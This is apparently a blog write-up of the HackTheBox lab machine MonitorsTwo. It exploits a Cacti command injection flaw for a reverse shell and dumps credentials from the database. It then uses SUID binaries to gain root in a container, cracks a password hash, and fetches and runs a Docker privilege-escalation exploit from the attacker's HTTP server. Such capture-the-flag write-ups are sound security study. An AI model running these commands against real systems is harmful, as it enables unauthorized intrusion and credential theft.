---
title: Writeup for the machine MonitorsTwo from Hackthebox 
layout: post
post-image: "https://github.com/0xRar/0xrar.github.io/assets/33517160/5b428116-be28-4d87-a85e-2e157a45cdd0"
description: 
tags:
- Writeups
- HackTheBox
- Boot2Root
- Web
- Network
---

## Machine Information
- Name: MonitorsTwo
- Difficulty: Easy
- URL: https://app.hackthebox.com/machines/MonitorsTwo

---

## Initial Enumeration
Starting with nmap:

```
┌──(kali㉿rar)-[~/HTB/MonitorsTwo]
└─$ nmap -p- -sV -T4 --min-rate=10000 10.10.11.211 | tee nmap.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 22:30 EDT
Warning: 10.10.11.211 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.211
Host is up (0.14s latency).
Not shown: 37441 closed tcp ports (conn-refused), 28092 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.95 seconds
```

### HTTP (80)
Opening the website shows that its running `cacti version 1.2.22` which is a performance and 
fault management framework and a frontend to RRDTool, bascially a monitoring tool

![cacti-version](https://github.com/0xRar/0xrar.github.io/assets/33517160/a82981a9-be7f-43e7-bc10-ca5cbf81d2f8)

Looking for vulnerabilities for this version of cacti turned out to be lucrative, the  
version is vulnerable to a command injection vulnerability that allows an unauthenticated user
to execute arbitrary code on a server running Cacti [CVE-2022-46169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-46169), 
so we can find publicly available Proof of Concept Exploit and get reverse shell.

## Initial Foothold
To establish a foothold on this machine i used this PoC exploit 
[FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) 
in the form of a reverse shell.

Listening for connections:
```shell
┌──(kali㉿rar)-[~/HTB/MonitorsTwo]
└─$ nc -lvnp 1337  
listening on [any] 1337 ...

```

Running the exploit:
```shell
┌──(kali㉿rar)-[~/HTB/MonitorsTwo]
└─$ python CVE-2022-46169/exploit.py -u http://10.10.11.211/ --LHOST=tun0_IP --LPORT=1337
```

And we are in ! 
![PoC success](https://github.com/0xRar/0xrar.github.io/assets/33517160/0c75957f-87f8-4d62-aff4-c1a894f2053b)


Now that we have access to the machine we can start enumerating and looking for anything that 
can allow us to get access to a local user, while looking for any scrips/files i found a shell script
(`entrypoint.sh`) on the root directory `/`, there is also a `.dockerenv` file which means we are currently
in a docker container!

```shell
www-data@50bca5e748b0:/$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

So what we got from that is there is a mysql service running locally and what got my interest is this line:
```shell
mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
```

We can get all the (`user_auth`) database dumped by modifying the command to display everything:
```shell
mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
```

This user in particular was interesting:
```
id	username		password	                                          realm	 full_name	     email_address
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb
```

Moving to priv esc.


## Privilege Escalation
But before cracking the hash to get the local user lets get root on the docker container it might be useful

### www-data to root (docker container)
<b>
note: not sure why but the priv esc for the docker container is different everytime
but both are easy so i will cover them both.
</b>

First command to run is to find if there is any binaries with the SUID bit set:
```shell
find / -perm -4000 -ls 2>/dev/null
```

If you got a reverse shell and it says `bash-5.1$` you will find `/bin/bash` & `/sbin/capsh`
which can get u root but if you got `www-data@50bca5e748b0` you can only get root via `/sbin/capsh`

```
    42364     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
    42417     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
    42317     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
    42314     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
    42407     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
     5431     32 -rwsr-xr-x   1 root     root        30872 Oct 14  2020 /sbin/capsh
    41798     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /bin/mount
    41819     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /bin/umount
    41766   1208 -rwsr-xr-x   1 root     root      1234376 Mar 27  2022 /bin/bash
    41813     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /bin/su
```

Getting root using `/bin/bash`:
```shell
bash-5.1$ /bin/bash -p
whoami
root
```

Getting root using `/sbin/capsh` <a href="https://gtfobins.github.io/gtfobins/capsh/">gtfobins - capsh</a>
```shell
bash-5.1$ cd /sbin
bash-5.1$ ./capsh --gid=0 --uid=0 --
whoami
root
```

Now that we got root on the docker container lets crack the local user `marcus` hashed password 
using John the Ripper! 
```shell
┌──(kali㉿rar)-[~/HTB/MonitorsTwo]
└─$ john marcus.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:01:21 DONE (2023-06-27 14:43) 0.01231g/s 105.0p/s 105.0c/s 105.0C/s randyorton..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can login via ssh using the creds we found `marcus:funkymonkey`

```
┌──(kali㉿rar)-[~/HTB/MonitorsTwo]
└─$ ssh marcus@10.10.11.211
```
<br>

Now we can get the user flag: 
```
marcus@monitorstwo:~$ cut -b 1-15 user.txt 
0b99c9d25593b87
```

Now we escaped the docker container and got a local user lets look for a way to get
root on the actual machine, what info do we have? we know docker is installed maybe its 
vulnerable to a local priv esc.

```
marcus@monitorstwo:~$ docker -v
Docker version 20.10.5+dfsg1, build 55c4c88
```

And indeed `Docker version 20.10.5` is vulnerable [`CVE-2021-41091`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41091) or the docker engine(moby) is vulnerable. 

I used this PoC exploit to get root [UncleJ4ck/CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091),
but first you need to run `chmod u+s /bin/bash` on the docker container and upload the exploit to the machine
we connected to via ssh

Running HTTP Server:
```shell
┌──(kali㉿rar)-[~/HTB/MonitorsTwo/CVE-2021-41091]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Getting the exploit from our HTTP server:
```shell
marcus@monitorstwo:/tmp$ wget http://tun0_IP:8000/exp.sh
```

Run the exploit:
```shell
marcus@monitorstwo:/tmp$ chmod +x exp.sh
marcus@monitorstwo:/tmp$ ./exp.sh
```

and if running the exploit didn't work and you are sure you set the SUID bit you can do this:
```shell
marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# whoami
root
```

and thats all ! 

```shell
bash-5.1# cut -b 1-15 root.txt
9285d5104e87a26
```
Thank You For Reading ❤
